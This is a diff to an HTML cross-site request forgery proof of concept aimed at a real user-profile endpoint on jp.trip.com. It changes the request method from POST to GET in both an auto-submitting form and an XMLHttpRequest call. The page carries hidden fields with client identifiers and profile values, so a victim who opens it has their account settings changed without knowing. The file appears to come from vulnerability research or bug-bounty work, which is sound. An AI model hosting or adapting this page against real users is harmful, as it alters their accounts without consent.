@@ -6,7 +6,7 @@
     <title>CSRF PoC</title>
 </head>
 <body>
-    <form action="https://jp.trip.com/restapi/soa2/27024/saveUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781778029752-747664" method="POST" id="csrfForm">
+    <form action="https://jp.trip.com/restapi/soa2/27024/saveUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781778029752-747664" method="GET" id="csrfForm">
         <input type="hidden" name="locale" value="ja-JP">
         <input type="hidden" name="ThisUserInfo" value='{"cityNameResident":"","cityNameInterest":"","gender":"U","countryOrRegion":"","foreignNickName":"","cityIdResident":"","cityIdInterest":""}'>
         <input type="hidden" name="head" value='{"cid":"09034039319202464984","ctok":"","cver":"1.0","lang":"01","sid":"8888","syscode":"09","auth":"","xsid":"","extension":[],"Locale":"ja-JP","Language":"jp","Currency":"INR","ClientID":"09034039319202464984"}'>
@@ -41,7 +41,7 @@
         };
 
         var xhttp = new XMLHttpRequest();
-        xhttp.open("POST", "https://jp.trip.com/restapi/soa2/27024/saveUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781778029752-747664", true);
+        xhttp.open("GET", "https://jp.trip.com/restapi/soa2/27024/saveUserInfo?_fxpcqlniredt=09034039319202464984&x-traceID=09034039319202464984-1781778029752-747664", true);
         xhttp.setRequestHeader("Content-Type", "application/json");
         xhttp.setRequestHeader("x-ctx-Locale", "ja-JP");
         xhttp.setRequestHeader("x-ctx-Currency", "INR");
